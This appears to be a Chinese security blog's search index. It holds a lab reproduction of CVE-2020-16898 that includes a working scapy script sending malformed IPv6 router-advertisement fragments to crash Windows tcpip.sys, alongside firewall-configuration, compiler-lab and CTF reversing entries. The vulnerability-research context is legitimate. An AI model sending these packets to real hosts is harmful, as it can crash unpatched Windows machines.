<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-16898调试复现记录</title>
      <link href="/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/"/>
      <url>/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>物理机：Windows 10 + windbg</p></li><li><p>虚拟机：Windows 10 1909版本</p></li><li><p>反编译：IDA</p></li></ul><p>由于我的本地环境win10中启用了hyper-v,在vmware 16.x中安装Windows 10  1709版本开启debug后会有冲突，会造成假死，所以使用了Windows 10 1909版本 </p><p>在win10系统中复制一个启动项，并且打开调试模式。代码如下</p><pre><code>bcdedit /dbgsettings serial baudrate:115200 debugport:1bcdedit /copy {current} /d DebugEntrybcdedit /displayorder {current} {ID}bcdedit /debug {ID} ONbcdedit /set {default} bootmenupolicy legacy</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110194402977.png" alt="image-20201110194402977"></p><p>vmware中打开IPV6，同时添加一个调试串口。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195236313.png" alt="image-20201110195236313"></p><p>设置管道 <code>\\.\pipe\com_1</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195437003.png" alt="image-20201110195437003"></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195547560.png" alt="image-20201110195547560"></p><p>配置windbg</p><p>不同版本的windbg使用不同的配置方式</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200043264.png" alt="image-20201110200043264"></p><p>配置符号</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200331013.png" alt="image-20201110200331013"></p><p>旧版本的windbg需要在桌面创建快捷方式，在后面添加参数。</p><p><code>-b -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect -y</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200849555.png" alt="image-20201110200849555"></p><h1 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h1><p>开始调试，设置reconnet，等待win10开机。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110201410605.png" alt="image-20201110201410605"></p><p>win10开机后，windbg处于调试运行状态，此时切换到kali中运行exp。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet6 <span class="token keyword">import</span> ICMPv6NDOptEFA<span class="token punctuation">,</span> ICMPv6NDOptRDNSS<span class="token punctuation">,</span> ICMPv6ND_RA<span class="token punctuation">,</span> IPv6<span class="token punctuation">,</span> IPv6ExtHdrFragment<span class="token punctuation">,</span> fragment6v6_dst <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:34b0:3a5d:3646:3313"</span>v6_src <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:351e:f5f7:5804:d271"</span>p_test_half <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> b<span class="token string">"\x18\x30"</span> <span class="token operator">+</span> b<span class="token string">"\xFF\x18"</span>p_test <span class="token operator">=</span> p_test_half <span class="token operator">+</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>c <span class="token operator">=</span> ICMPv6NDOptEFA<span class="token punctuation">(</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>e<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">21</span>e<span class="token punctuation">.</span>dns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span> <span class="token punctuation">]</span>aaa <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>aaa<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">8</span>pkt <span class="token operator">=</span> ICMPv6ND_RA<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> aaa <span class="token operator">/</span> \      Raw<span class="token punctuation">(</span>load<span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p_test_half <span class="token operator">+</span> b<span class="token string">"\x18\xa0"</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> ep_test_frag <span class="token operator">=</span> IPv6<span class="token punctuation">(</span>dst<span class="token operator">=</span>v6_dst<span class="token punctuation">,</span> src<span class="token operator">=</span>v6_src<span class="token punctuation">,</span> hlim<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">/</span> \              IPv6ExtHdrFragment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>pktl<span class="token operator">=</span>fragment6<span class="token punctuation">(</span>p_test_frag<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">for</span> p <span class="token keyword">in</span> l<span class="token punctuation">:</span>    send<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改exp中的源地址和目标地址，源地址修改为kali的ipv6地址。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110224712749.png" alt="image-20201110224712749"></p><p>修改目标地址</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225345566.png" alt="image-20201110225345566"></p><p>运行后win10假死状态，windbg中断，可以发现发生了异常，使用!analyze -v运行分析。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110223459821.png" alt="image-20201110223459821"></p><p>tcpip!_report_gsfailure</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225721871.png" alt="image-20201110225721871"></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225901670.png" alt="image-20201110225901670"></p><h1 id="IDA-分析"><a href="#IDA-分析" class="headerlink" title="IDA 分析"></a>IDA 分析</h1><p>使用ida加载tcpip.sys</p><h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWN练习记录</title>
      <link href="/2020/11/03/pwn-lian-xi-ji-lu/"/>
      <url>/2020/11/03/pwn-lian-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="2020年11月3日-练习记录"><a href="#2020年11月3日-练习记录" class="headerlink" title="2020年11月3日 练习记录"></a>2020年11月3日 练习记录</h1>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>飞塔防火墙配置将内网ip映射到外网</title>
      <link href="/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/"/>
      <url>/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image(1).png" alt="Image(1)"></p><pre><code>启动以后重设密码execute factoryresetshow system interfaceconfig system interfaceedit port1set mode staticset ip 192.168.93.99 255.255.255.0   nat的其中一个地址end此时即可开启web登录</code></pre><h2 id="配置WAN"><a href="#配置WAN" class="headerlink" title="配置WAN"></a>配置WAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image.png" alt="Image"></p><h2 id="配置LAN"><a href="#配置LAN" class="headerlink" title="配置LAN"></a>配置LAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B2%5D.png" alt="Image [2]"></p><p>配置映射内网ip到外网，先配置虚拟ip</p><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B3%5D.png" alt="Image [3]"></p><h2 id="配置防火墙策略"><a href="#配置防火墙策略" class="headerlink" title="配置防火墙策略"></a>配置防火墙策略</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B4%5D.png" alt="Image [4]"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Affinic Debugger for GDB 安装注册过程</title>
      <link href="/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/"/>
      <url>/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Affinic-Debugger"><a href="#Affinic-Debugger" class="headerlink" title="Affinic Debugger"></a>Affinic Debugger</h1><p>Affinic Debugger，.aka。ADG旨在成为各种调试器的日常图形用户界面（GUI）。此构建专门针对GDB，GNU调试器和LLDB，LLVM调试器。通过图形窗口，ADG可以通过在一个视图中查看多个信息，然后单击轻松进行调试，从而释放您正在使用的调试器的全部功能。ADG还提供了一个独特的集成命令终端，供用户直接输入调试器命令以完成在文本模式下可以执行的任何任务。ADG在Linux / Windows / Mac OS X上可用。</p><p>Affinic Debugger的目标是为任何类型的用户提供最佳的调试体验。它试图通过直观的界面提供超快的速度，以操纵代码和大量数据以帮助分析。ADG提供了其他IDE无法做到的功能，例如GDB / LLDB终端，程序集调试，远程调试，反汇编，内存更新和线程调试等。ADG是一个不断发展的产品。欢迎您提供反馈意见，以帮助它变得更好，更强大。只需给我们发送电子邮件。</p><p><strong>就是一款GUI的调试器，用的是GDB或者LLDB作为后端。</strong></p><p>官方地址： <a href="http://www.affinic.com/?page_id=109" target="_blank" rel="noopener">http://www.affinic.com/?page_id=109</a></p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>分为Windows 版本和Linux 版本，</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> gdb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Affinic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMP授权keygen分析</title>
      <link href="/2020/01/11/vmp-shou-quan-keygen-fen-xi/"/>
      <url>/2020/01/11/vmp-shou-quan-keygen-fen-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> VMP </tag>
            
            <tag> keygen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tiny 实验报告</title>
      <link href="/2020/01/11/tiny-shi-yan-bao-gao/"/>
      <url>/2020/01/11/tiny-shi-yan-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h1><h2 id="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"><a href="#分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构" class="headerlink" title="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"></a>分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构</h2><h3 id="词法规则"><a href="#词法规则" class="headerlink" title="词法规则"></a>词法规则</h3><p>下面是LEX中的变量声明</p><p>定义段可以包含任意的C语言文件，符号说明，其代码会被直接拷贝到生成的扫描器代码文件中</p><p>声明示例如下</p><blockquote><p>%{</p><p>…</p><p>%}</p></blockquote><pre><code>digit       [0-9]number      {digit}+letter      [a-zA-Z]identifier  {letter}+newline     \nwhitespace  [ \t]+</code></pre><p>下面是一些关键字，规则段利用正则表达式来匹配模式，每当成功匹配一个模式，就对应其后“{ }” 中的代码。</p><p>语法规则示例如下</p><blockquote><p>%%</p><p>…</p><p>%%</p></blockquote><pre class="line-numbers language-c++"><code class="language-c++">"if"            {return IF;}"then"          {return THEN;}"else"          {return ELSE;}"end"           {return END;}"repeat"        {return REPEAT;}"until"         {return UNTIL;}"read"          {return READ;}"write"         {return WRITE;}":="            {return ASSIGN;}"="             {return EQ;}"<"             {return LT;}"+"             {return PLUS;}"-"             {return MINUS;}"*"             {return TIMES;}"/"             {return OVER;}"("             {return LPAREN;}")"             {return RPAREN;}";"             {return SEMI;}{number}        {return NUM;}{identifier}    {return ID;}{newline}       {lineno++;}{whitespace}    {/* skip whitespace */}"{"             { char c;                  do                  { c = input();                    if (c == EOF) break;                    if (c == '\n') lineno++;                  } while (c != '}');                }.               {return ERROR;}%%int yywrap(){ return 1;}TokenType getToken(void){ static int firstTime = TRUE;  TokenType currentToken;  if (firstTime)  { firstTime = FALSE;    lineno++;    yyin = source;    yyout = listing;  }  currentToken = yylex();  strncpy(tokenString,yytext,MAXTOKENLEN);  if (TraceScan) {    fprintf(listing,"\t%d: ",lineno);    printToken(currentToken,tokenString);  }  return currentToken;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加<code>//</code> 和 <code>/* */</code>的规则</p><pre class="line-numbers language-C"><code class="language-C">"//"             { char c;                  do                  { c = input();                    if (c == EOF) break;                  } while (c != '\n');                }"/*"             { char c;                   int d=0;                  do                  { c = input();                    if (c == '/'&&d==1)                    d=2;                    else if(c !='/'&&d==1)                     d=0;                    if (c == EOF) break;                    if (c == '\n') lineno++;                    if (c == '*') d=1;                  } while (d != 2);                }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111132822132.png" alt="image-20200111132822132"></p><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><p>需要先修改tiny.l使其多识别一种符号</p><pre class="line-numbers language-C"><code class="language-C">"while"         {return WHILE;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法规则主要在YACC中，添加 while 语法在tiny.y文件中增加声明和定义</p><pre class="line-numbers language-C"><code class="language-C">%token WHILEwhile_stmt     : WHILE exp THEN stmt_seq END                 { $$ = newStmtNode(WHILEK);                   $$->child[0] = $2;                   $$->child[1] = $4;                 }            ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>newStmtNode(WHILEK)</code> </p><p>还需要修改<code>cgen</code>文件，增加对于<code>WHILEK</code>的处理</p><pre class="line-numbers language-c"><code class="language-c">      <span class="token keyword">case</span> WHILEK <span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span> <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"-> while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         p1 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         p2 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* generate code for test expression */</span>         savedLoc1 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>         savedLoc2 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"while: jump to else belongs here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"LDA"</span><span class="token punctuation">,</span>pc<span class="token punctuation">,</span>savedLoc1<span class="token punctuation">,</span><span class="token string">"jmp to end"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* recurse on then part */</span>         currentLoc <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitBackup</span><span class="token punctuation">(</span>savedLoc2<span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"JEQ"</span><span class="token punctuation">,</span>ac<span class="token punctuation">,</span>currentLoc<span class="token punctuation">,</span><span class="token string">"while: jmp to else"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRestore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span>  <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"&lt;- while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* WHILEK_k */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tny文件修改为,从10 倒序打印</p><pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">{</span> Sample program  in TINY language <span class="token operator">-</span>  computes factorial<span class="token punctuation">}</span>read x<span class="token comment" spellcheck="true">// sssss</span><span class="token comment" spellcheck="true">/* ddd */</span><span class="token punctuation">;</span> <span class="token punctuation">{</span> input an integer <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;</span> x then <span class="token punctuation">{</span> don't compute <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">}</span>  fact <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  repeat    fact <span class="token punctuation">:</span><span class="token operator">=</span> fact <span class="token operator">*</span> x<span class="token punctuation">;</span>    x <span class="token punctuation">:</span><span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span>  until x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  write fact  <span class="token punctuation">{</span> output factorial of x <span class="token punctuation">}</span>end<span class="token punctuation">;</span>y <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token number">0</span> <span class="token operator">&lt;</span> y then  y <span class="token punctuation">:</span><span class="token operator">=</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  write yend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>语法树：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153138350.png" alt="image-20200111153138350"></p><p>运行的效果：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153205806.png" alt="image-20200111153205806"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF 总决赛第四题</title>
      <link href="/2019/12/30/kctf-zong-jue-sai-di-si-ti/"/>
      <url>/2019/12/30/kctf-zong-jue-sai-di-si-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="西部乐园-WP"><a href="#西部乐园-WP" class="headerlink" title="西部乐园 WP"></a>西部乐园 WP</h1><h1 id="第六题-三道八佛"><a href="#第六题-三道八佛" class="headerlink" title="第六题 三道八佛"></a>第六题 三道八佛</h1><blockquote><p>题目信息：Windows </p><p>题目来源：2019 看雪CTF总决赛</p></blockquote><p>打了一次看雪总决赛，这是选取了其中的第六题，最后是由队友提交的writeup，所以会在看雪论坛找到同样的过程。</p><p>题目是多层SMC完成的对于代码的加密，使用OD加载程序以后发现跑起来非常的卡。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111011819888.png" alt="image-20200111011819888"></p><p>由于SMC的代码量很大，所以在OD中不太好用，我选择了x32dbg。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111012429056.png" alt="image-20200111012429056"></p><p>由于采用了多层的smc，所以在ida中是无法直接分析算法的。</p><p>程序开头进行两个 <strong>VirtualProtect</strong> 进行修改.修改属性为可读写执行. 下面会不断的进行代码重定位.并且操作 <strong>FS:[4] FS:[8]</strong> 等来进行保存用户输入的UserName 以及 序列号</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/723188_7CW2JQEEDFDXY5Z.png" alt="img"></p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013459617.png" alt="image-20200111013459617"></p><p>动态跑起来，可以发现最初输入的KCTF 被填充了。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013823999.png" alt="image-20200111013823999"></p><p>下面的call eax 就是进行切换堆栈，并且跳入下一层smc 中。并且开始抹除原始代码。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013943021.png" alt="image-20200111013943021"></p><pre><code>$calleax = 0$num = 0$jnzaddr = 0$f = 0$prevaddr = 0$retaddr=0$hasj=0bph 004014DFrun//input the username and passwordbphcstart:find cip,FFD0,0x200cmp $result,0je overmov $calleax,$resultbph $calleaxrunbphcinc $numStepIntoStepIntoStepOvermov $jnzaddr,cipfind_jnz:find cip,8BE55DC3,0x220cmp $result,0je nobpmov $retaddr,$resultbph $retaddr+3runbphcStepIntoStepIntoinc $nummov $jnzaddr,cipnobp:find jnzaddr,75??,0x200cmp $result,0jnz isjnzjnzs:find cip,0F85????????,0x200cmp $result,0jnz isjnzsjmp nofoundruntojnz:mov f,0bph $jnzaddr+2mov $hasj,1jmp jnzsruntojnzs:mov f,0mov $jnzaddr,$resultbph $jnzaddr+6runbphc mov $hasj,0nofound:cmp $hasj,1jnz nojumpmov $hasj,0runbphcnojump:jmp startisjnz:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzadd $jnzaddr,2jmp find_jnzisjnzs:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzscmp $hasj,1jnz nojjmp nofoundnoj:add $jnzaddr,2jmp find_jnzover:cmp f,0jnz endmov f,1jnzaddr=cipjmp find_jnzend:log decryptnum:{$num}msg 